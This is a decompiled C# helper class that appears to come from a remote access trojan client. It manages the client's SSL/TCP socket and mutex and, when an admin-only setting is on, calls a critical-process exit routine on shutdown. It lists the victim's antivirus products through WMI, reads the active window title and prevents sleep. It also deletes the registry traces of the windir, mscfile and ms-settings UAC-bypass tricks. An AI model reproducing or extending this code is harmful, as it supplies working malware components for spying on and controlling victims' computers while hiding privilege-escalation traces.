using System;
using System.Drawing.Imaging;
using System.Management;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using Client.Connection;
using Microsoft.Win32;

namespace Client.Helper;

public static class Methods
{
	public static bool IsAdmin()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void ClientOnExit()
	{
		try
		{
			if (Convert.ToBoolean(Settings.BS_OD) && IsAdmin())
			{
				ProcessCritical.Exit();
			}
			MutexControl.CloseMutex();
			ClientSocket.SslClient?.Close();
			ClientSocket.TcpClient?.Close();
		}
		catch
		{
		}
	}

	public static string Antivirus()
	{
		//IL_001f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0025: Expected O, but got Unknown
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0040: Expected O, but got Unknown
		try
		{
			string text = string.Empty;
			ManagementObjectSearcher val = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "Select * from AntivirusProduct");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						text = text + ((ManagementBaseObject)val2).get_Item("displayName").ToString() + "; ";
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			text = RemoveLastChars(text);
			return (!string.IsNullOrEmpty(text)) ? text : "N/A";
		}
		catch
		{
			return "Unknown";
		}
	}

	public static string RemoveLastChars(string input, int amount = 2)
	{
		if (input.Length > amount)
		{
			input = input.Remove(input.Length - amount);
		}
		return input;
	}

	public static ImageCodecInfo GetEncoder(ImageFormat format)
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		ImageCodecInfo[] imageDecoders = ImageCodecInfo.GetImageDecoders();
		int num = 0;
		ImageCodecInfo val;
		while (true)
		{
			if (num < imageDecoders.Length)
			{
				val = imageDecoders[num];
				if (val.get_FormatID() == format.get_Guid())
				{
					break;
				}
				num++;
				continue;
			}
			return null;
		}
		return val;
	}

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern NativeMethods.EXECUTION_STATE SetThreadExecutionState(NativeMethods.EXECUTION_STATE esFlags);

	public static void PreventSleep()
	{
		try
		{
			SetThreadExecutionState((NativeMethods.EXECUTION_STATE)2147483651u);
		}
		catch
		{
		}
	}

	public static string GetActiveWindowTitle()
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), stringBuilder, 256) > 0)
			{
				return stringBuilder.ToString();
			}
		}
		catch
		{
		}
		return "";
	}

	public static void ClearSetting()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Environment");
			if (registryKey.GetValue("windir") != null)
			{
				registryKey.DeleteValue("windir");
			}
			registryKey.Close();
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software", writable: true)!.OpenSubKey("Classes", writable: true)!.DeleteSubKeyTree("mscfile");
		}
		catch
		{
		}
		try
		{
			Registry.CurrentUser.OpenSubKey("Software", writable: true)!.OpenSubKey("Classes", writable: true)!.DeleteSubKeyTree("ms-settings");
		}
		catch
		{
		}
	}
}
